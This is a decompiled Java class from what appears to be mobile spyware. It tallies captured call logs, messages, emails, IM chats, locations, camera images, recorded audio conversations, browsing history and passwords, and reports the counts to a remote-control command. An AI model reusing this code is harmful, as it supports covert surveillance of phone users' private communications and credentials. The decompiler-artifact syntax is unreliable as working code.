package com.vvt.appengine.a;

import com.vvt.ak.a;
import com.vvt.base.FxEventType;
import com.vvt.events.FxEventDirection;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.output.RmtCtrlOutputEventCount;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

public class i
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  public RmtCtrlOutputEventCount a(com.vvt.eventrepository.b paramb)
  {
    boolean bool1 = a;
    if (bool1) {}
    HashMap localHashMap1 = new java/util/HashMap;
    localHashMap1.<init>();
    HashMap localHashMap2 = new java/util/HashMap;
    localHashMap2.<init>();
    HashMap localHashMap3 = new java/util/HashMap;
    localHashMap3.<init>();
    try
    {
      bool1 = a;
      if (bool1) {}
      localObject1 = paramb.a();
      Object localObject2 = new java/util/ArrayList;
      ((ArrayList)localObject2).<init>();
      localObject4 = FxEventType.CALL_LOG;
      ((List)localObject2).add(localObject4);
      localObject4 = FxEventType.SMS;
      ((List)localObject2).add(localObject4);
      localObject4 = FxEventType.MAIL;
      ((List)localObject2).add(localObject4);
      localObject4 = FxEventType.SYSTEM;
      ((List)localObject2).add(localObject4);
      localObject4 = FxEventType.MMS;
      ((List)localObject2).add(localObject4);
      localObject4 = FxEventType.IM;
      ((List)localObject2).add(localObject4);
      localObject4 = FxEventType.VOIP_CALL_LOG;
      ((List)localObject2).add(localObject4);
      boolean bool2 = a;
      if (bool2) {}
      localObject4 = ((List)localObject2).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject4).hasNext();
        if (!bool1) {
          break;
        }
        localObject2 = ((Iterator)localObject4).next();
        localObject2 = (FxEventType)localObject2;
        localObject5 = FxEventDirection.IN;
        int j = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject2, (FxEventDirection)localObject5);
        localObject5 = Integer.valueOf(j);
        localHashMap1.put(localObject2, localObject5);
        localObject5 = FxEventDirection.OUT;
        j = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject2, (FxEventDirection)localObject5);
        localObject5 = Integer.valueOf(j);
        localHashMap2.put(localObject2, localObject5);
      }
      bool1 = a;
    }
    catch (Exception localException)
    {
      bool1 = b;
      if (bool1) {}
      localObject3 = new com/vvt/remotecontrol/RemoteControlException;
      ((RemoteControlException)localObject3).<init>("Counting events failed!!");
      throw ((Throwable)localObject3);
    }
    if (bool1) {}
    Object localObject3 = FxEventType.CALL_LOG;
    Object localObject4 = FxEventType.CALL_LOG;
    Object localObject5 = FxEventDirection.MISSED_CALL;
    int i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4, (FxEventDirection)localObject5);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.LOCATION;
    localObject4 = FxEventType.LOCATION;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.SETTINGS;
    localObject4 = FxEventType.SETTINGS;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.WALLPAPER_THUMBNAIL;
    localObject4 = FxEventType.WALLPAPER_THUMBNAIL;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.WALLPAPER;
    localObject4 = FxEventType.WALLPAPER;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.CAMERA_IMAGE_THUMBNAIL;
    localObject4 = FxEventType.CAMERA_IMAGE_THUMBNAIL;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.CAMERA_IMAGE;
    localObject4 = FxEventType.CAMERA_IMAGE;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.AUDIO_CONVERSATION;
    localObject4 = FxEventType.AUDIO_CONVERSATION;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.AUDIO_CONVERSATION;
    localObject4 = FxEventType.AUDIO_CONVERSATION;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.AUDIO_FILE_THUMBNAIL;
    localObject4 = FxEventType.AUDIO_FILE_THUMBNAIL;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.AUDIO_FILE;
    localObject4 = FxEventType.AUDIO_FILE;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.VIDEO_FILE_THUMBNAIL;
    localObject4 = FxEventType.VIDEO_FILE_THUMBNAIL;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.VIDEO_FILE;
    localObject4 = FxEventType.VIDEO_FILE;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.BROWSER_URL;
    localObject4 = FxEventType.BROWSER_URL;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.APPLICATION;
    localObject4 = FxEventType.APPLICATION;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.ADDRESS_BOOK;
    localObject4 = FxEventType.ADDRESS_BOOK;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.IM_ACCOUNT;
    localObject4 = FxEventType.IM_ACCOUNT;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.IM_CONTACT;
    localObject4 = FxEventType.IM_CONTACT;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.IM_CONVERSATION;
    localObject4 = FxEventType.IM_CONVERSATION;
    i = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    localObject4 = Integer.valueOf(i);
    localHashMap3.put(localObject3, localObject4);
    localObject3 = FxEventType.PASSWORD;
    localObject4 = FxEventType.PASSWORD;
    int k = ((com.vvt.eventrepository.eventresult.b)localObject1).a((FxEventType)localObject4);
    Object localObject1 = Integer.valueOf(k);
    localHashMap3.put(localObject3, localObject1);
    localObject3 = new com/vvt/remotecontrol/output/RmtCtrlOutputEventCount;
    ((RmtCtrlOutputEventCount)localObject3).<init>();
    ((RmtCtrlOutputEventCount)localObject3).setIncomingEvents(localHashMap1);
    ((RmtCtrlOutputEventCount)localObject3).setOutgoingEvents(localHashMap2);
    ((RmtCtrlOutputEventCount)localObject3).setOtherEvents(localHashMap3);
    boolean bool3 = a;
    if (bool3) {}
    return (RmtCtrlOutputEventCount)localObject3;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */